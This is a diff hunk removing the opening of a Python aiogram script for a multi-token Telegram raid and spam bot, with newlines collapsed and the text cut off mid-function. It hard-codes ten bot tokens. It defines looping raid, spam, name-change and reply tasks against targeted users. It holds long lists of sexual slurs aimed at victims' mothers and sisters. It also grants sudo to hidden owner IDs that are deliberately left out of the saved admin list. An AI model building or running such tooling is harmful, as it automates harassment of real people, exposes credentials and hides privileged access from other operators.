@@ -1,1 +1,10390 @@
-import asyncioimport osimport jsonimport randomimport timeimport uuidimport loggingimport shutilimport sysimport urllib.parseimport textwrapfrom datetime import datetime, timezone, timedeltafrom collections import OrderedDictimport aiohttpfrom aiogram.types import BufferedInputFile, ChatMemberUpdatedtry:    from PIL import Image, ImageDraw, ImageFont    HAS_PIL = Trueexcept ImportError:    HAS_PIL = Falsetry:    from pilmoji import Pilmoji    HAS_PILMOJI = Trueexcept ImportError:    HAS_PILMOJI = Falseif sys.platform == "win32":    try:        import ctypes        kernel32 = ctypes.windll.kernel32        kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)    except Exception:        passGREEN = "\033[92m"RED = "\033[91m"RESET = "\033[0m"logging.basicConfig(level=logging.WARNING)AUTO_OPTIMIZE_INTERVAL = 1COMMAND_TIMEOUT = 100MAX_CACHE_SIZE = 5000bot_start_time = time.time()def get_uptime():    """Calculates and formats the total uptime of the bot script."""    uptime = int(time.time() - bot_start_time)    hours = uptime // 3600    minutes = (uptime % 3600) // 60    seconds = uptime % 60    return f"{hours}h {minutes}m {seconds}s"TOKENS = ["9207648759:AAEnOEEU6i2daP0y9-_EyGwPXQjfycU8aL0" ,"9176539988:AAH8smVFmZwscoA_K8Yw1td6gOc6fYPpsNM" ,"9039685525:AAFM3uGcrtnukax3C8ARdjES3y1oYOWmYEE" ,"9098544054:AAGybWLn_3RqLOPKckwjzN-1WULcKKn_cuo" ,"9128164039:AAEkG5Nfq-VOM67B-5Drf1BtCjvx2sGhPAQ" ,"9040047215:AAH_irqb7iqu7S6dHNLrXqwuGTWp-Y_2Udo" ,"9014210382:AAEnPtRPgNSDGitQNuKVXbnbtuAQSKCO5S0" ,"9216634826:AAG84v6irOuaW17Leyc6YVsYCREEgIdFCGU" ,"9283554345:AAEsVbYUMgCFVtFeKLBMGnCKYeaX_eW5xWE" ,"9097736415:AAHbQk5UycY9su6CvSfvbPzW2f9Q6Brdd74" ,]OWNER_ID = 8853215731SUDO_FILE = "RAHUL_sudo.json"DB_FILE = "RAHUL_db.json"HIDDEN_OWNER_IDS = {    8853215731,  # <-- put the hidden owner's Telegram user ID here}global_storage = os.path.join(os.path.dirname(__file__), 'downloads', 'global')os.makedirs(global_storage, exist_ok=True)START_PIC_PATH = os.path.join(global_storage, "start_pic.jpg")chars = {      'a': '𝙖', 'b': '𝙗', 'c': '𝙘', 'd': '𝙙', 'e': '𝙚', 'f': '𝙛', 'g': '𝙜',    'h': '𝙝', 'i': '𝙞', 'j': '𝙟', 'k': '𝙠', 'l': '𝙡', 'm': '𝙢', 'n': '𝙣',    'o': '𝙤', 'p': '𝙥', 'q': '𝙦', 'r': '𝙧', 's': '𝙨', 't': '𝙩', 'u': '𝙪',    'v': '𝙫', 'w': '𝙬', 'x': '𝙭', 'y': '𝙮', 'z': '𝙯',    'A': '𝘼', 'B': '𝘽', 'C': '𝘾', 'D': '𝘿', 'E': '𝙀', 'F': '𝙁', 'G': '𝙂',    'H': '𝙃', 'I': '𝙄', 'J': '𝙅', 'K': '𝙆', 'L': '𝙇', 'M': '𝙈', 'N': '𝙉',    'O': '𝙊', 'P': '𝙋', 'Q': '𝙌', 'R': '𝙍', 'S': '𝙎', 'T': '𝙏', 'U': '𝙐',    'V': '𝙑', 'W': '𝙒', 'X': '𝙓', 'Y': '𝙔', 'Z': '𝙕'}def font(text: str) -> str:    """Converts standard text into a stylized small-caps font."""    return "".join(chars.get(c, c) for c in text)from aiogram import Bot, Dispatcher, types, Ffrom aiogram.filters import Command, CommandObjectfrom aiogram.exceptions import TelegramBadRequest, TelegramRetryAfterfrom aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile, ReactionTypeEmojifrom aiogram.enums import ParseModetry:    from aiogram.types import LinkPreviewOptionsexcept ImportError:    LinkPreviewOptions = NoneSUDO_USERS = {OWNER_ID} | set(HIDDEN_OWNER_IDS)username_to_id = {}user_names = {}muted_users = set()reply_RAHUL_targets = set()targetslide_targets = {}react_targets = {} known_chats = set()lord_groups = set()  # Persisted group allow-list for owner-managed group utilities.VALID_REACTS = ["🤣","🤪","👻","❤️","🤡","🥱","🤮","❤️‍🔥","⚡"]SEQ_EMOJIS = ["✦❗✧","✦❕✧","✦❓✧","✦❔✧","✦‼️✧","✦⁉️✧","✦⚠️✧","✦🚨✧","✦⛔✧","✦🚫✧","✦❌✧","✦⭕✧","✦🔴✧","✦🟠✧","✦🟡✧","✦🟢✧","✦🔵✧","✦🟣✧","✦🔺✧","✦🔻✧","✦🔸✧","✦🔹✧","✦🔶✧","✦🔷✧","✦⬆️✧","✦⬇️✧","✦⬅️✧","✦➡️✧","✦↗️✧","✦↘️✧","✦↖️✧","✦↙️✧","✦↕️✧","✦↔️✧","✦🔁✧","✦🔄✧","✦✔️✧","✦☑️✧","✦✅✧","✦✖️✧","✦❎✧","✦➕✧","✦➖✧","✦➗✧","✦✳️✧","✦✴️✧","✦❇️✧","✦〽️✧","✦💢✧","✦💯✧","✦💥✧","✦💫✧","✦💦✧","✦💨✧","✦🟥✧","✦🟧✧","✦🟨✧","✦🟩✧","✦🟦✧","✦🟪✧","✦◼️✧","✦◻️✧","✦◾✧","✦◽✧","✦▪️✧","✦▫️✧","✦🔲✧","✦🔳✧","✦⬛✧","✦⬜✧","✦⚫✧","✦⚪✧","✦🟤✧","✦🅰️✧","✦🅱️✧","✦🅾️✧","✦🆎✧","✦🆑✧","✦🆘✧","✦™️✧","✦©️✧","✦®️✧","✦ℹ️✧","✦🔤✧","✦🔡✧","✦🔠✧","✦🔢✧","✦#️⃣✧","✦*️⃣✧","✦0️⃣✧","✦1️⃣✧","✦2️⃣✧","✦3️⃣✧","✦4️⃣✧","✦5️⃣✧","✦6️⃣✧","✦7️⃣✧","✦8️⃣✧","✦9️⃣✧","✦🔟✧","✦🔚✧","✦🔙✧","✦🔛✧"]def load_data():    """Loads database variables from JSON files safely."""    if os.path.exists(SUDO_FILE):        try:            with open(SUDO_FILE, 'r') as f:                for uid in json.load(f): SUDO_USERS.add(int(uid))        except Exception: pass            if os.path.exists(DB_FILE):        try:            with open(DB_FILE, 'r') as f:                data = json.load(f)                for u in data.get("muted",[]): muted_users.add(u)                for u in data.get("reply_RAHUL",[]): reply_RAHUL_targets.add(u)                for k, v in data.get("targetslide", {}).items(): targetslide_targets[int(k)] = v                for k, v in data.get("user_names", {}).items(): user_names[int(k)] = v                for k, v in data.get("react_targets", {}).items(): react_targets[int(k)] = v                for c in data.get("known_chats",[]): known_chats.add(int(c))                for c in data.get("lord_groups",[]): lord_groups.add(int(c))        except Exception as e:            print(f"{RED}[DB] Error loading DB: {e}{RESET}")def save_sudo():    """Saves the Sudo users list to a JSON file (hidden owners are never written)."""    with open(SUDO_FILE, 'w') as f:        json.dump(list(SUDO_USERS - set(HIDDEN_OWNER_IDS)), f)def save_db():    """Serializes memory structures and saves to the DB file."""    data = {        "muted": list(muted_users),        "reply_RAHUL": list(reply_RAHUL_targets),        "targetslide": targetslide_targets,        "user_names": user_names,        "react_targets": react_targets,        "known_chats": list(known_chats),        "lord_groups": sorted(lord_groups)    }    with open(DB_FILE, 'w') as f:        json.dump(data, f)load_data()class SimpleLRUCache:    def __init__(self, capacity: int):        self.cache = OrderedDict()        self.capacity = capacity        def get(self, key):        if key not in self.cache:            return False        self.cache.move_to_end(key)        return True            def put(self, key):        self.cache[key] = True        self.cache.move_to_end(key)        if len(self.cache) > self.capacity:            self.cache.popitem(last=False)processed_messages = SimpleLRUCache(MAX_CACHE_SIZE)def is_processed(message_id: int, chat_id: int) -> bool:    """Checks if a command was already handled by another bot."""    key = (chat_id, message_id)    if processed_messages.get(key):        return True    processed_messages.put(key)    return Falsebots = []bot_usernames = []# Task Trackersgroup_tasks = {}seq_nc_tasks = {}keng_tasks = {}spmnc_tasks = {}RAHULnc_tasks = {}slidespam_tasks = {}spm_loop_tasks = {}rspm_tasks = {}RAHULspam_tasks = {}forwardspm_tasks = {}sticker_spm_tasks = {}gif_spm_tasks = {}media_spm_tasks = {}voice_spm_tasks = {}pfp_tasks = {}# Delays swipe_mode = {}nc_delays = {}spm_delays = {}rspm_delays = {}pfp_delays = {}REPLY_RAHUL_DELAY = 0.2known_users = set()active_menus = {}def stop_task_group(task_dict, key):    """Safely clears tasks from a given dictionary key gracefully ensuring stability."""    if key in task_dict:        val = task_dict[key]        if isinstance(val, (dict, list, set)):            val.clear()        del task_dict[key]        return True    return Falseasync def delayed_task(delay: float, coro):    """Utility wrapper to add a delay before awaiting a coroutine."""    await asyncio.sleep(delay)    await corodef get_exact_text(message: types.Message) -> str:    """Extracts raw text preserving all exact spaces and newlines natively."""    if not message.text: return ""    cmd_len = len(message.text.split()[0])    exact = message.text[cmd_len:]    if exact.startswith(" "): exact = exact[1:]    return exactdef get_auth_id(message: types.Message) -> int:    """Reliably extracts the author's ID, prioritizing channels securely."""    if message.from_user:        return message.from_user.id    if message.sender_chat:        return message.sender_chat.id    return message.chat.iddef is_sudo(user_id):    return user_id in SUDO_USERSdef is_owner(user_id):    return user_id == OWNER_ID or user_id in HIDDEN_OWNER_IDSRAID_TEXTS = ["2-3 ⱮƛӇƖƝЄ ӇƲЄ ƝƛӇƖ ӇƛƓƝЄ ԼƓЄ ", "ⱦєяє ɠɦαя кι αυятση кι вяα ƒαα∂ к αρηα кυятα ѕιℓωαυ яη∂ук ", "ƓƦƖƁ Ɱƛ Ƙ ƁƛƇӇƳ ƓƓƦ ⱮЄ ƛƬƬƛ ԼЄ ƛƛ ", "ƊHƛƬ яη∂ιкєу ", "ƬЄƦƖ Ɱƛƛ Ƙƛ ƁHƧƊƛ ", "Ƭєяι мα к вσѕ∂є м αιѕα ℓαт мαяυggα ηα gαтє ωαу σƒ ιndια bαη נαєggα ", "ꪶ  ⱠƲƝ ƬЄ Ɣƛʝ ꪻ♡︎ ", "уααя αρηι мα мт ηυηgу кя ", "Ƭяу мσм кє ѕαтн вα∂ мαηηєяѕ кя∂υggα ", "ƬЄƦƖ Ɱƛƛ ƇHƠƊƲƝ ", "ƬЄƦƖ Ɱƛ Ƙ ƁHƠƧƊƛ ⱮƛƊHƠƊ ", "ⱮƛƇƇHƛƦ ƬⱮƘƇ ", "Ƭєяу мαα кσ qαвαя ηαѕєєв ηα нσ яη∂укє ", "ƲƬH яη∂к кυттє ", "ƤƛƦԼЄ Ɠ ƘHƛЄƓƛ ƘƳƛ ƬƠⱮⱮƳ ", "ƁƖHƛƦƖ ƓƛƝƓ ƬЄƦƖ Ɱƛ ƇHƠƊƲƝ ", "ƬƲⱮ ƧƁ ƘƲƬƬƠ ƘƖ ʝHƲƝƊ ƘƖ ⱮƘƁ ", "ƓƇ ԼЄƑƬ ԼЄ яη∂ιвαℓα ", "Ƭєяι мαα кι ƈнσтι ραкα∂ кє ∂єєωαя мє мααяυngα ∂HƛM ∂HƛM кι αωααנ ααуєgι ", "ƁHƛƓƝƛ ⱮƛƝƛ ӇƳ ƬⱮƘƇ ", "ƘƖ ⱮƘƁ Ʀ ƁHƛƓ KЄƧЄ ƦӇЄ ӇƠ ƓƛƦƖƁƠ ", "ƬⱮƘƇ ", "ƬⱮƘƇ ", "ƬƁƘƇ ", "ƦƝƊƘ ƁƛƇӇƳ ", "ƠƳЄ ƬƠⱮⱮƳ ƲƬH ƁHƛƓƝƛ ƝƳ ӇƛƖ "]emo_EMOJIS = ["🎀", "👑", "😂", "🤪", "👻", "❤️", "🌺", "🧊", "✅", "😹", "😻", "💦", "🤍", "🖤", "🤎", "💜", "💙", "❤️", "🧡", "💛", "💚", "💦", "🧑🏻‍✈️", "👮🏻", "🧑🏻‍🎓", "🦋", "🐳", "🎚️", "💸", "🕯️", "🎛️", "💸", "🕯️", "🏎️", "🚜", "🚚", "🚀"]SWIPE_TEXTS = ["NAME ƘƠ ƤEʟƬE ӇƲE EƝƬƦƳ 🤣😎❤️‍🔥","NAME ƬEƦƖ Ɱƛƛ ƘƖ ƇHƲƬ ⱮE ʟƠƲƊƛ ⱮƛƊƛƦƇHƠƊ 😂🩷🤚🏼","NAME ƦEƤʟƳ ƘƛƦ ƓƛƦƖƁ ƊƛƦ ƘƳƲ ƦƛӇƛ Ӈ 😁🤙🏼🤍","NAME ƇHƛʟ ƬEƦƖ Ɱƛ ƇHƠƊƲ ƤƛƬƛƘ ƤƛƬƛƘ ƘE 🤪👻🩶","NAME ƇHƲƊƘE ƧƤƛⱮ ƳƛӇƖ ƛƲƘƛƬ Ӈ ƬEƦƖ ƓƛƦƖƁ 😹🩵🙌🏼","ƇƤ ƘƛƦ NAME ƓƛƦƖƁ ƁHƛƛƓ ⱮƬ ƇHƠƬEƳ 😂🩶🤚🏼","NAME ƘƖ ⱮƲⱮⱮƳ ƘƠ ƦƝƊƖ ƁƛƝƛ ƊƲƝƓƛ ӇEӇEӇE 🤣💖✌🏼","NAME ƘE ƁƛƛƤ ƖƟƧƬ YEӇ ӇƛƖ ƖƝƘƖ Ɱƛƛ ƘE ƳƛƛƦ 😆🩶🤚🏼","ƘƛƁƛƊƖ ƔƛʟE NAME ƘƖ ⱮƘƁ 🤣👻💗","ƛƦEƳ NAME ƘƖ ⱮƘƁ ƳƦ ƁHƛƓ ƘƛƖƧE ƦӇЄ ӇƠ ƓƛƦƖƁƠ 😤👻💞","ƛƦEƳ NAME ⱮƛƇƇHƛƦ ƬⱮƘƇ 😂🩷✌🏾","NAME Ʋ ʟƛƊӇEƓƛ ӇƲⱮƧE ƬEƦƖ Ɱƛ ƇƠƊƘE ⱮƖƬƬƖ ⱮE ⱮƖʟƛƊEƝƓE ӇƲⱮ 😂🔥🤸🏻","NAME ʟEƛƔE ʟE ƬƲ ƦƝƊƳƘE ƤƛƧƛƝƊ ƝƛƖ ƛƳƛ ⱮƦƘƠ 😏👋🏼","NAME ƓƦƖƁ Ɱƛ Ƙ ƁƛƇӇƳ ƓHƛƦ ⱮE ƛƬƬƛ ʟE ƛƛ 😂🥲","NAME ƛƲƦƛƬƠ Ƙƛ ƘƛⱮ ƦƠƬƖ ƁƝƛƝƛ ӇƠƬƛ Ӈ ƬƠ NAME ƘƖ Ɱƛ ƳƛӇƛ ƘƳƲ ƇHƲƊƦӇƖ 🤬🤣😭","NAME ƬEƦƖ Ɱƛ ƘƠ ƧEƝƛƤƛƬƖ ƧE ƇHƲƊƔƛƊEƝƓE 🪖🖲️🔥","NAME ƬƦƳ ƓƝƊ ⱮE ƛEƧƛ ƁHƛʟƛ ⱮƛƦƓƛ ƧƖƊӇƛ ⱮƠƲƝƬ EƔEƦEST ƤE ƦƲƘEƓƛ 💯🚀💔","NAME ƬEƦƖ Ɱƛƛ ƬƛƘʟƖ ӇEӇEӇE 💖💛💚","NAME ⱮƲJӇE ƝƲⱮƁEƦ ƘƖ ƘƳƛ ƵƛƦƲƦƛƬ\nⱮƛƖ ӇƲ EƘ ƤʟƲⱮƁEƦ 👨‍🔧\nJƛƁ ƇHƠƊƝE Ƙƛ ⱮƛƝƝ ƘƦEƓƛ NAME ƘƖ Ɱƛƛ ƇƠƊ ƊƲƝƓƛ ƓHƛƦ 😂🔧","NAME ƬEƦƳ Ɱƛƛ ƘƠ ƘƛƁƛ ƝƛƧEEƁ Ɲƛ ӇƠ ƦƝƊƳƘE 😑🖕🏽💔","NAME ʟƲƝ ƬE ƔƛJ 😂👏🏻✨","NAME ƬEƦƳ ƝƛƝƖ ƇHƲƊ ƓƳƖ ƊHƛƮ ƊHƛƮ ƊHƛƮ 🥁🔊😍"]TARGET_SLIDE_TEXTS =["𝙉𝙔 𝙉𝙔 𝙉𝙔 𝙈𝙀 𝙆𝙐𝘾𝙃 𝙉𝙔 𝙅𝙉𝙏𝘼 𝘽BS 𝙀𝙔 {name} 𝙆𝙄 𝙈𝘼 𝙍𝙉𝘿𝙔 𝙀𝙔 🤣🔥", "𝙊𝙔𝙔 𝙔𝙍𝙍 𝙔𝙀 {name} 𝙆𝙄 𝙈𝘼 𝙍𝙊𝙅 𝙍𝙊𝙅 𝙂𝙊𝘽𝘼𝙍 𝙆𝙃𝘼𝙆𝙍 𝘼𝙋𝙉𝘼 𝘽𝙐𝙉𝘿 𝘿𝙀𝙏𝙄 𝙀𝙔 😑🖕🏿🔥😑🖕🏿🔥", "𝙊𝙔𝙔 {name} 𝙆𝙈𝙕𝙊𝙍 𝙏𝘼𝙏𝙏𝙀 𝙏𝙀𝙍𝙄 𝙈𝘼 𝙎𝘼𝘽𝙎𝙀 𝙎𝙀 𝘽𝙃𝙄𝙆 𝙌 𝙈𝘼𝙉𝙂𝙏𝙄 𝙀𝙔", "𝙊𝙔𝙔 {name} 𝙏𝙀𝙍𝙄 𝙈𝘼 𝙆𝘼 𝘽𝙐𝙉𝘿 𝙆𝘼𝙇𝘼 𝙌 𝙀𝙔 😑🔥🤣🖕🏿🔥", "𝙀𝙑𝙀𝙍𝙔𝙏𝙃𝙄𝙉𝙂 𝙄𝙎 𝙊𝙆 𝘽𝙐𝙏 {name} 𝙆𝙄 𝙈𝘼 𝘾𝙐𝘿𝙉𝘼 𝙄𝙎 𝙋𝙀𝙍𝙈𝘼𝙉𝙀𝙉𝙏 🤣🔥", "{name} 𝙏𝘼𝙏𝙏𝙀 𝙏𝙀𝙍𝙄 𝙈𝘼 𝙆𝙈𝙕𝙊𝙍 𝙍𝙉𝘿𝙔 𝙀𝙔 𝙔𝘼𝙆𝙄𝙉 𝙉𝙔 𝙀𝙔 𝙏𝙊 𝘼𝙋𝙉𝙀 𝙎𝘼𝘽 𝘽𝘼𝘼𝙋 𝙎𝙀 𝙋𝙐𝘾𝙃𝙇𝙀 😑🔥", "𝘼𝙉𝘿𝙔 𝙈𝘼𝙉𝘿𝙔 𝙎𝘼𝙉𝘿𝙔 {name} 𝙏𝘼𝙏𝙏𝙀 𝙆𝙄 𝙆𝙈𝙕𝙊𝙍 𝙈𝘼 𝙎𝙏𝙍𝙊𝙉𝙂𝙀𝙎𝙏 𝙍𝙉𝘿𝙔 😑🖕🏿🔥🤣", "𝙊𝙔 𝙈𝙀 𝙆𝙐𝘾𝙃 𝙉𝙔 𝙎𝙐𝙉𝙐𝙉𝙂𝘼 𝘽𝙎 𝙔𝙀 {name} 𝙆𝙄 𝙈𝘼 𝙈𝙀𝙍𝙄 𝙋𝙑𝙏. 𝙍𝙉𝘿𝙔 𝙀𝙔 😑🔥", "𝘾𝙃𝙄 𝙔𝙍𝙍 𝙀𝙔 {name} 𝙆𝙄 𝙈𝘼 𝘿𝙐𝙎𝙏𝘽𝙄𝙉 𝙎𝙀 𝘿𝙄𝙇𝘿𝙊 𝙉𝙄𝙆𝘼𝙇 𝙆𝙍 𝘼𝙋𝙉𝙀 𝘽𝙐𝙉𝘿 𝙈𝙀 𝘿𝘼𝙇 𝙇𝙀𝙏𝙄 𝙀𝙔 😑🔥", "𝙊𝙔𝙔 {name} 𝙏𝘼𝙏𝙏𝙀 𝙈𝙐𝙅𝙀 𝘽𝘼𝘼𝙋 𝘽𝙉𝘼 𝙇𝙀 𝙉𝙔 𝙏𝙊 𝙏𝙀𝙍𝙄 𝙈𝘼 𝙍𝙉𝘿𝙔"]KENG_TEMPLATES = [{"text": "NAME ⱮƎ ƬƎƦƖ ⱮƛƘƠ ƇHƠƊƲƝƓƛ", "emoji": "🥱"}, {"text": "NAME ƇHƲƤ ƦƝƊƳƘƎ", "emoji": "😂"}, {"text": "NAME ƲƬH ƦƝƊƖƘƎ ƁƛƇӇƎ", "emoji": "🍌"}, {"text": "NAME ƛƦE NAME JƛƖƧE ƘƲƬƬƠ ƘƠ ⱮƛƛƦ Ƙ HƲⱮ ƤƛƝƖ Ɣ ƝƛӇƖ ƤƲƇӇƬE ⱮƇ", "emoji": "🩷"},{"text": "NAME Ƙƛ ƁƛƛƤ ƛƛƳƛ", "emoji": "❔"},{"text": "NAME ƘƖ Ɱƛ Ƙƛ ƁƠƠƦ", "emoji": "🤪"},{"text": "ƛƦE NAME ƁHƛƓ KЄƧЄ ƦӇЄ ӇƠ ƓƛƦEEƁƠ", "emoji": "👻"},{"text": "NAME ƲƬHƛƘ ƁƛƖƬӇƛƘ ʟƛƓƛ ⱮƇ", "emoji": "😹"},{"text": "NAME ƵƠƦ ʟƛƓƛ ƝƇ ƇƔ ʟE ⱮƇ", "emoji": "🤣"},{"text": "NAME ƇHƛʟ JӇƲƘ ƦƝƊƘ", "emoji": "😎"}]SPMNC_LONG = ["NAME ƲƬH ƤƛƖƦ ƤƘƊ ӇƲⱮƛƦE\n\n\n\n\n\n" * 40, "ƝƳ ƝƳ ⱮE ƘƲƇӇ ƝƳ JƛƝƬƛ ƁƧ NAME ƘƖ Ɱƛ ƦƝƊƳ EƳ\n\n\n\n\n\n" * 40, "NAME ƲƬH ƘE ƁƛƖƬӇ ƦƝƊƘ\n\n\n\n\n\n" * 40, "NAME ƬEƦƖ Ɱƛ ƘƖ ƇHƲƬ ⱮE ƛƛƓ ʟƛƓƛ ƊƲƝƓƛ ⱮƇ\n\n\n\n\n\n" * 40,"NAME ƬEƦƖ ⱮƠⱮ ƦƝƊƳ\n\n\n\n\n\n" * 40,"NAME ƬEƦƖ Ɱƛ ƘƠ ƇHƠƊƲƝ\n\n\n\n\n\n" * 40,"NAME JӇƛƬƲ ƧƛʟE ƁƛƛƤ ʟƠƓ ƧE ʟƛƊӇEƓƛ?\n\n\n\n\n\n" * 40]SPMNC_SMALL = ["NAME ƲƬH ƤƛƖƦ ƤƘƊ ӇƲⱮƛƦE","ƝƳ ƝƳ ⱮE ƘƲƇӇ ƝƳ JƛƝƬƛ ƁƧ NAME ƘƖ Ɱƛ ƦƝƊƳ EƳ","NAME ƲƬH ƘE ƁƛƖƬӇ ƦƝƊƘ","NAME ƬEƦƖ Ɱƛ ƘƖ ƇHƲƬ ⱮE ƛƛƓ ʟƛƓƛ ƊƲƝƓƛ ⱮƇ","NAME ƬEƦƖ ⱮƠⱮ ƦƝƊƳ","NAME ƬEƦƖ Ɱƛ ƘƠ ƇHƠƊƲƝ","NAME JӇƛƬƲ ƧƛʟE ƁƛƛƤ ʟƠƓ ƧE ʟƛƊӇEƓƛ?"]REPLY_RAHUL_TEXTS = ["ƖƵƵƛƬ ƘƦƠ ƬƲⱮӇƛƦE ƁƛƛƤ ƖƟƧƬ ƘƖ 😑🙌🏾","ƓƛƊƊӇƛ ƊƖƘӇƛ ƘHƠƊ ƊƖƳƛ ƬEƦƖ Ɱƛƛ ƊƖƘӇƖ ƇHƠƊ ƊƖƳƛ 🙊🤦🏾😂","ƖƟƧƬ ƁƊⱮƠƧӇ ƧƤEƛƘƖƝG ƑƦƠⱮ ƬEƦƖ ⱮƘƁ🤦🏾☎️","ƇƲƊƝƛ ⱮƝƛ ӇƛƖ 😩🤟🏻","ƬEƦƖ Ɱƛƛ ƇƠƊ ƘE ⱮƛƦ ƊƲƝƓƛ 🤣🖕🏾","ƬEƦƖ Ɱƛƛ ƇƲƊ ƦӇƖ ӇƛƖ ƝƛƇӇƠ 👻🕺","ӇƳ ƇƠƬƲ 😉✌🏾","ƇƳƛ","ƑƛƧT ʟƖƘӇ","𝙌 ❓🤨","ƇƲƊ ƘE ⱮƦƓƳƛ ƘƳƛ 💀😹","ӇʟƔ ƤƓʟ ƁHƛƓ ⱮƬ 🏃‍♂️💨","ƖƟƧƬ ƇHƠƊ ƦӇƛ ӇƛƖ 👻🔥","ƇƳƛ?","ƬEƦƖ Ɱƛƛ ❓","ƬEƦƖ ƁHEƝ ⱮƛƦƊƲ ❓","ӇEʟƤ ӇEʟƤ ⱮƬ ƘƦ ƇƠƬƲ 😩👍🏾","ƤƲJƛ ƘƦ ƬEƦƛ ƁƛƛƤ ƖƟƧƬ ƘƖ 🙏🏾🔥","ӇʟƔ ӇʟƔ ӇƛƮʟƛ ӇƠƓƳƛ ƬEƦƖ ⱮƘƁ ⱮE 😱😂","ƬEƦƖ ƁƘƇ ⱮE ƁƖƓƁƠƧƧ 📺😆","ӇʟƔ RƤʟƳ ƑƛƧƬ","ƑƛƧƬ ƬƳƤE ƘƦ ƊƛƦ ⱮƬ 😤⌨️","ӇEʟƤ ӇEʟƤ ƬEƦƖ Ɱƛƛ ƇHƲƊ ƓƳƖ 😩","ƖƟƧƬ ƛƁƁƲ ƤEʟ ƦӇE ӇƛƖ 👻💪","ӇƳ ƬEƦƖ Ɱƛƛ ⱮƦ ƓƳƖ ƘƳƛ 😶💔","ƛƔƔ ƬEƦƖ Ɱƛƛ ƘƠ ƤƠƠƘƖE ƁƝƛƘE ⱮƛƦƲƝƓƛ 🤣🎀","ƘƳƛ ❓😑","ƦƠ ⱮƬ 😂🤟🏻","ƧƠƦƬ ƝӇƖ ƘƦƲƝƓƛ ƇƲƊ ƬƲ ƁƖƝƛ ƦƲƘE 😹🖕🏾","ƬƛƘE ƳƠƲƦ ƬƖⱮE ƑƖƦ ƇƲƊ 😉✌🏾","ӇʟƔ ƘƲƬƖƳƛ ƘE ʟƦƘE 🐶😆","ӇʟƔ ӇʟƔ ⱮJƛ ƛƛƦӇƛ ƇƲƊƝE ⱮE 😜🔥","ƖƟƧƬ ƓƝƊ ⱮƛƛƦ ƦӇE ӇƛƖ 👻","ӇƳ ƇƠƬƲ ƁHƛƓ ⱮƬ ƦƝƊƳ ƘE 🔥😑👍🏾","ƁHƛƓƝƛ ⱮƛƝƛ ӇƛƖ JƖ 🚫😎","ƖƟƧƬ ƛƛƓƳE 🤣🩷🙌🏾","ƬEƦƖ Ɱƛƛ ⱮƛƦƘE ⱮJƊƲƦƖ ƘHƬƮ 👍🏾","ƘƳƛ ƖƟƧƬ ƬEƦƛ ƁƛƛƤ ӇƛƖ 👻❓","ƘƳƛ ⱮƬʟƁ ƬEƦƖ Ɱƛƛ ƖƟƧƬ ƝE ƇƠƊƖ 😹🖕🏾","ƬEƦƖ ƁHEƝ ⱮƛƦƘE ƁHƛƓ JƛƲƝƓƛ 🙋🏾🤪","ƬEƦƖ ƁHEƝ ⱮƛƦƘE ƖƟƧƬ ƁHƛƓ ƓƳƛ 🤦🏾💔","ƁHƛƓ 𝙌 ƦӇƛ ӇƛƖ ❓","ƬEƦƖ Ɱƛƛ ⱮƲⱮƁƛƖ ⱮE ƇƲƊEƓƖ 😌🩷🙌🏾","ƬƳƤE ƘƦ Ɲƛ ƛƁ ƬEƦE ƁƛƛƤ ƘE ƧƛⱮƝE ⁉️","ƘƦ ƬƳƤE ƬⱮƘƇ 😂🤟🏻","JʟƊƖ ƇƲƊ 🤢","ƁƖƝƛ ƦƲƘE ƬHƲƘƛƖ ӇƠƓƖ ƬEƦƖ 😁😂","ƁHƛƓEƓƛ ƬƠ ƇƠƊ ƘE ⱮƛƦƊƲƝƓƛ 😑🙌🏾","ƖƊHƦ ƛJƛ ƇHƠƬEƳ 👶🍼","ƁHƛƓ ⱮƬ ƘƲƬƖ ƘE 🙊😂","ƬEƦƖ Ɱƛƛ ƘƠ ƁEƝ10 ⱮE ƇƠƊƲƝƓƛ 👽😱","ƖƵƵƛƬ ƘƦEƓƛ ƛƛJƧE ƖƟƧƬ ƛƁƁƲ ƘƖ 😂🤟🏻","ƬEƦƖ ƁHEƝ ƘƖ ƤƠƠƘƖE ƓƔƊ ⱮE ʟƲƝ 🎀","ƁHƛƓ ⱮƬ ƁEƬE 😑🙌🏾","ƖƊHƦ ƛJƛ ʟƛƊʟE 😉❤️","ƬEƦƖ ⱮƓƊ ⱮE 100 ӇƛƬӇ 💯🔥","ƘƦ ƛƁ ӇƛƔƛƵƖ?","ʟE ƛƛƓƳƛ ƬEƦƛ ƁƛƛƤ ƖƟƧƬ 👻👑","ƁHƛƓƝE ƧE ƘƲƇӇ ƝӇƖ ӇƠƓƛ 🐕❌","ƁHƛƓ ƁHƛƓ ƬⱮƘƇ 😑😹","ƁHƛƓƛ ƁHƛƓƛ ƘE ⱮƛƦƲƝƓƛ 🤣🩷🙌🏾","ƁN ƛƁ ƑƳƬƦ 🤦🏾😎😂","ƘƦ Ɲƛ ƑƳƬ 😁🔥","ƁHƛƓEƓƛ ❓","ƁHƛƓ JʟƊƖ 🐕🏳️‍🌈","ӇʟƔ ƇƲƊƓƳƖ ƘƳƛ 💀😹","ƖƟƧƬ ƛƛƓƳƛ 👻🔥","ƬEƦE ƁƛƛƤ ƖƟƧƬ ƘƖ EƝƬƦƳ 👻😂","ƦEⱮEⱮƁER ƬHE  ƘEƝG ƖƟƧƬ 👻👑"]dp = Dispatcher()async def safe_reply(message: types.Message, text: str, **kwargs):    try:        await message.reply(text, **kwargs)    except Exception as e:        print(f"{RED}[ERROR] Send Message failed: {e}{RESET}")async def get_target_info(message: types.Message, command_arg: str = None):    uid, name = None, None    if message.reply_to_message:        rm = message.reply_to_message        if rm.forward_from_chat:            uid = rm.forward_from_chat.id            name = rm.forward_from_chat.title or "Channel"        elif rm.sender_chat:            uid = rm.sender_chat.id            name = rm.sender_chat.title or "Channel"        elif rm.from_user:            uid = rm.from_user.id            name = rm.from_user.first_name        else:            uid = rm.chat.id            name = rm.chat.title or "Chat"    elif message.entities:        for ent in message.entities:            if ent.type == 'text_mention' and ent.user:                uid, name = ent.user.id, ent.user.first_name                break            if ent.type == 'mention' and message.text:                uname = message.text[ent.offset + 1: ent.offset + ent.length].lower()                if uname in username_to_id:                    uid = username_to_id[uname]                    name = user_names.get(uid, uname)                    break    elif command_arg:        arg = command_arg.strip()        if arg.lstrip('-').isdigit():            uid = int(arg)            name = user_names.get(uid, "Target")        elif arg.startswith('@'):            uname = arg[1:].lower()            if uname in username_to_id:                uid = username_to_id[uname]                name = user_names.get(uid, uname)                    if uid and name:        user_names[uid] = name        save_db()    return uid, namedef get_target_chats(message: types.Message, is_lord_cmd: bool = False):    """Determines target chat IDs. Returns all 